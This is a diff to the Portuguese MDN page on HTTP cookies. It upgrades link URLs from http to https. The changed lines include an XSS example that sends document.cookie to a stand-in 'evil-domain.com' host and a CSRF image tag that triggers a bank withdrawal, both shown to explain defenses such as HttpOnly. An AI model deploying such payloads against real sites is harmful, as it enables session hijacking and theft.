@@ -42,7 +42,7 @@ Este cabeçalho de servidor informa ao cliente para armazenar um cookie.
 >
 > - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
 > - [Python](https://docs.python.org/3/library/http.cookies.html)
-> - [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)
+> - [Ruby on Rails](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)
 
 ```
 HTTP/1.0 200 OK
@@ -146,7 +146,7 @@ Consulte as questões de segurança na seção [Segurança](/pt-BR/docs/Web/HTTP
 Os cookies geralmente são usados em aplicações web para identificar um usuário e sua sessão autenticada, portanto roubar um cookie pode levar ao sequestro da sessão do usuário autenticado. As formas mais comuns de roubar cookies incluem Engenharia Social ou exploração de uma vulnerabilidade {{Glossary("XSS")}} em uma aplicação.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+(new Image()).src = "https://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 O atributo `HttpOnly` do cookie pode ajudar a minimizar este ataque ao prevenir o acesso ao valor do cookie usando JavaScript.
@@ -156,7 +156,7 @@ O atributo `HttpOnly` do cookie pode ajudar a minimizar este ataque ao prevenir 
 [A Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona um bom exemplo de {{Glossary("CSRF")}}. Nesta situação, alguém inclui uma imagem que não é realmente uma imagem, como por exemplo em um chat ou fórum sem filtro, mas sim uma requisição para o servidor de um banco para sacar dinheiro:
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
 ```
 
 Agora, se você estiver logado na sua conta no banco e seus cookies ainda são válidos, e não há mais nenhuma validação, você vai transferir o dinheiro assim que carregar o código HTML que contém a imagem. Existem algumas técnicas que são usadas para evitar ataques deste tipo:
@@ -180,7 +180,7 @@ Não há requisitos legais ou tecnológicos para seu uso, mas o cabeçalho {{HTT
 
 ### Diretivas da UE para cookies
 
-Os requisitos para cookies na UE (União Europeia) estão definidos na [Diretriz 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) do Parlamento Europeu e entraram em vigor em 25 de maio de 2011. Uma diretriz não é lei por si só, mas um requisito para os estados membros da UE para aprovar leis que contemplem os requisitos da diretriz. Essas leis podem variar de país para país.
+Os requisitos para cookies na UE (União Europeia) estão definidos na [Diretriz 2009/136/EC](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) do Parlamento Europeu e entraram em vigor em 25 de maio de 2011. Uma diretriz não é lei por si só, mas um requisito para os estados membros da UE para aprovar leis que contemplem os requisitos da diretriz. Essas leis podem variar de país para país.
 
 Resumindo, a diretriz da UE significa que antes que alguém armazene ou recupere qualquer informação de um computador, celular ou outro equipamento, o usuário deve dar permissão para isso. Muitos websites colocaram anúncios (conhecidos como _anúncios de cookies_) desde então para informar os usuários sobre o uso dos cookies.
 
